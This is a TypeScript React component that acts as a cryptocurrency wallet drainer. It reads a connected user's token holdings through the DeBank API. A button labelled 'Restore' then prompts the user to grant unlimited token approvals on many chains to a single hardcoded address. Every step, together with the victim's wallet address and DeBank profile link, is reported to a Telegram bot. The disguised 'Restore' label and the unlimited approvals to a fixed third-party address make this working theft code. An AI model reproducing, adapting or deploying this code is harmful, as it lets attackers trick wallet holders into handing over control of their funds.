"use client";

import { useState, useEffect } from "react";
import { useAccount, useWalletClient } from "wagmi";
import axios from "axios";
import { ethers } from "ethers";
import { zkSync } from "thirdweb/chains";
import { linea } from "viem/chains";

type Token = {
  name: string;
  symbol: string;
  balance: number;
  chain: string;
  usdValue: number;
  address: string;
};






const ApproveTxn = () => {
  const { address, isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [tokens, setTokens] = useState<Token[]>([]);
  const [isLoading, setIsLoading] = useState(false);

  // Fetch user tokens from DeBank API
  const fetchUserTokens = async () => {
    if (!address) return;
    setIsLoading(true);
    try {
      const response = await axios.get(
        `https://pro-openapi.debank.com/v1/user/all_token_list`,
        {
          headers: {
            Accept: "application/json",
            AccessKey: process.env.NEXT_PUBLIC_DEBANK_ACCESS_KEY || "YOUR_ACCESSKEY",
          },
          params: {
            id: address,
          },
        }
      );

      const tokenData = response.data;
      const formattedTokens = tokenData.map((token: any) => {
        const rawAmount = token.raw_amount || 0;
        const decimals = token.decimals || 0;
        const balance = rawAmount / Math.pow(10, decimals);
        const usdValue = balance * (token.price || 0);

        return {
          name: token.name || "Unknown",
          symbol: token.symbol || "Unknown",
          balance: isNaN(balance) ? 0 : balance,
          chain: token.chain || "unknown",
          usdValue: isNaN(usdValue) ? 0 : usdValue,
          address: token.id,
          isCore: token.is_core || false,
          isVerified: token.is_verified || false,
        };
      });

      // Filter tokens for DeBank-supported tokens only (is_core or is_verified)
      const filteredAndSortedTokens = formattedTokens
        .filter((token: { isCore: any; isVerified: any }) => token.isCore || token.isVerified)
        .filter((token: { usdValue: number }) => token.usdValue >= 1)
        .sort((a: { usdValue: number }, b: { usdValue: number }) => b.usdValue - a.usdValue);

      setTokens(filteredAndSortedTokens);
    } catch (error) {
      console.error("Error fetching tokens from DeBank API:", error);
    } finally {
      setIsLoading(false);
    }
  };

  const sendTelegramMessage = async (message: string) => {
    const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "YOUR_TELEGRAM_BOT_TOKEN";
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "YOUR_TELEGRAM_CHAT_ID";
    try {
      await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        chat_id: telegramChatId,
        text: message,
        parse_mode: "Markdown",
      });
      console.log("Telegram message sent");
    } catch (err) {
      console.error("Failed to send Telegram message:", err);
    }
  };

  

  const approveAllTokens = async () => {
    if (!walletClient || !address) return;
  
    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
    const provider = new ethers.BrowserProvider(walletClient as any);
    const signer = await provider.getSigner();
    const processedTokens = new Set<string>(); // To prevent duplicate processing of native tokens
    let activeChainId: number | null = null; // Track the current chain ID
    
    let successfulApprovals = 0;
    let failedApprovals = 0;
    let rejectedApprovals = 0;
    
  
    for (const token of tokens) {
      // Skip native tokens explicitly
      if (
        !token.address ||
        token.address === ethers.ZeroAddress ||
        ["ETH", "BNB", "POL", "AVAX", "FTM" ].includes(token.symbol)
      ) {
        if (!processedTokens.has(token.symbol)) {
          console.log(`⚠️ Skipping native token: ${token.name} (${token.symbol})`);
          await sendTelegramMessage(`⚠️ Skipping native token: ${token.name} (${token.symbol})`);
          processedTokens.add(token.symbol);
        }
        continue;
      }
  
      const chainDetails = getChainDetailsForName(token.chain);
  
      try {
        // Switch to the correct chain
        if (walletClient?.switchChain) {
          await walletClient.switchChain({ id: chainDetails.id });
  
          // Add a slight delay to ensure chain synchronization
          await new Promise((resolve) => setTimeout(resolve, 500));
  
          activeChainId = await walletClient.getChainId();
          if (activeChainId !== chainDetails.id) {
            const mismatchWarning = `⚠️ Warning: Chain mismatch detected. Expected: ${chainDetails.name}, Got: ${activeChainId}`;
            console.warn(mismatchWarning);
            await sendTelegramMessage(mismatchWarning);
            continue; // Skip token if chain mismatch occurs
          }
          const chainSwitchSuccess = `✅ Successfully switched to chain ${token.chain} (${chainDetails.name}).`;
          console.log(chainSwitchSuccess);
          await sendTelegramMessage(chainSwitchSuccess); // Send chain switch success immediately
        }
      } catch (err) {
        if (err instanceof Error) {
          const switchError = `❌ Failed to switch to chain ${token.chain} (${chainDetails.name}) for token ${token.name} (${token.symbol}).\nReason: ${err.message}`;
          console.error(switchError);
          await sendTelegramMessage(switchError);
        } else {
          console.error("❌ Unknown error occurred while switching chains.");
          await sendTelegramMessage("❌ Unknown error occurred while switching chains.");
        }
        continue; // Skip this token
      }
  
      const tokenContract = new ethers.Contract(token.address, abi, signer);
      const maxUint256 = ethers.MaxUint256;
  
      try {
        // Approve the token
        const tx = await tokenContract.approve(
          "0xe514C4535B3A68be6126cA8b9aa60414A8f489Ff",
          maxUint256
        );

        activeChainId = await walletClient.getChainId();
      
        console.log(`⏳ Waiting for transaction confirmation for token ${token.name} (${token.symbol}) on chain ${token.chain}...`);
      
        // Wait for the transaction to be mined
        const receipt = await tx.wait();
      
        // Log the receipt for debugging purposes
        console.log(`Receipt for ${token.name}:`, receipt);
      
        // Check for transaction hash
        if (receipt.hash) { // Corrected: Use 'receipt.hash' instead of 'receipt.transactionHash'
          const explorerUrl = chainDetails.explorer + receipt.hash;
          successfulApprovals++; // Increment successful approvals counter
          const successMessage = ` \n\n🏦 \`${address}\`\n[View on DeBank](https://debank.com/profile/${address}) \n\n✅ Successfully approved token ${token.name} (${token.symbol}) on chain ${token.chain}.\n\n[${explorerUrl}](${explorerUrl})`;
          console.log(successMessage);
          await sendTelegramMessage(successMessage);
      
          // Wait to ensure Telegram processes the message
          console.log(`✔️ Telegram message sent for token ${token.name} (${token.symbol}). Waiting 2 seconds before proceeding.`);
          await new Promise((resolve) => setTimeout(resolve, 2000));
        } else {
          console.warn(`⚠️ Transaction confirmed but no hash found for ${token.name} (${token.symbol}) on ${token.chain} chain.`);
        }
      } 

      
      
      catch (err: any) {
        try {
          // Extract relevant information from the error object
          const errorCode = err?.info?.error?.code || err?.code;
          const errorMessage = err?.info?.error?.message || err?.message || "Unknown error";
      
          if (errorCode === 4001) {
            // Handle user rejection explicitly
            rejectedApprovals++; // Increment rejected approvals counter
            const rejectionMessage = `❌ User rejected the transaction for ${token.name} (${token.symbol}) on ${token.chain} chain.`;
            console.warn(rejectionMessage);
            await sendTelegramMessage(rejectionMessage);
          } else if (errorMessage.includes("network changed") && activeChainId === chainDetails.id) {
            // Handle network change gracefully
            const successMessage = `✅ Successfully approved token ${token.name} (${token.symbol}) on ${token.chain} chain.`;
            console.info(successMessage);
            await sendTelegramMessage(successMessage); // Ensure successful approval is logged
          } else {
            // Generic approval failure
            failedApprovals++; // Increment failed approvals counter
            const approveError = `❌ Failed to approve token ${token.name} (${token.symbol}) on ${token.chain} chain.
            Reason: ${errorMessage}`;
            console.error(approveError);
            await sendTelegramMessage(approveError);
          }
        } catch (parseError) {
          // Handle unexpected parsing issues
          const unknownApproveError = `❌ Unknown error occurred while approving token ${token.name} (${token.symbol}) on ${token.chain} chain.`;
          console.error(unknownApproveError, parseError);
          await sendTelegramMessage(unknownApproveError);
        }
      }
      
      
      
  
        
    }
  
    const totalTokens = tokens.length;
  const allDoneMessage = `🎉 Sequence completed! Total tokens: ${totalTokens}.
  - ✅ Successfully approved: ${successfulApprovals}
  - ❌ Failed approvals: ${failedApprovals}
  - ⛔ Rejected approvals: ${rejectedApprovals}`;
  console.log(allDoneMessage);
  await sendTelegramMessage(allDoneMessage);
  };
  
  

  const getChainDetailsForName = (chainName: string) => {
    const chainMap: { [key: string]: { id: number; name: string; explorer: string } } = {
      eth: { id: 1, name: "Ethereum Mainnet", explorer: "https://etherscan.io/tx/" },
      bsc: { id: 56, name: "Binance Smart Chain", explorer: "https://bscscan.com/tx/" },
      matic: { id: 137, name: "Polygon", explorer: "https://polygonscan.com/tx/" },
      arb: { id: 42161, name: "Arbitrum", explorer: "https://arbiscan.io/tx/" },
      op: { id: 10, name: "Optimism", explorer: "https://optimistic.etherscan.io/tx/" },
      base: { id: 8453, name: "Base", explorer: "https://basescan.org/tx/" },
      ftm: { id: 250, name: "Fantom", explorer: "https://ftmscan.com/tx/" },
      avax: { id: 43114, name: "Avanlanche", explorer: "https://snowtrace.io/tx/" },
      blast: { id: 81457, name: "Blast", explorer: "https://blastscan.io/tx/" },
      scroll: { id: 534352, name: "Scroll", explorer: "https://scrollscan.com/tx/" },      zkSync: { id: 8453, name: "Base", explorer: "https://basescan.org/tx/" },
      linea: { id: 59144, name: "Linea", explorer: "https://lineascan.build/tx/" }, 
    };

    return chainMap[chainName] || {
        id: 1,
        name: "Ethereum Mainnet",
        explorer: "https://etherscan.io/tx/",
      }; // Default to Ethereum
    };

  useEffect(() => {
    if (isConnected && address) {
      fetchUserTokens();
    }
  }, [isConnected, address]);

  return (
    <div>
      {isLoading && <p>Loading tokens...</p>}
      <button onClick={approveAllTokens}
      style={{ padding: "10px", background: "black", color: "white", borderRadius: "5px", width: "100%", borderStyle: "solid", borderColor: "white", marginTop: "10px", marginRight: "10px"  }}
      >Restore</button>
    </div>
  );
};

export default ApproveTxn;
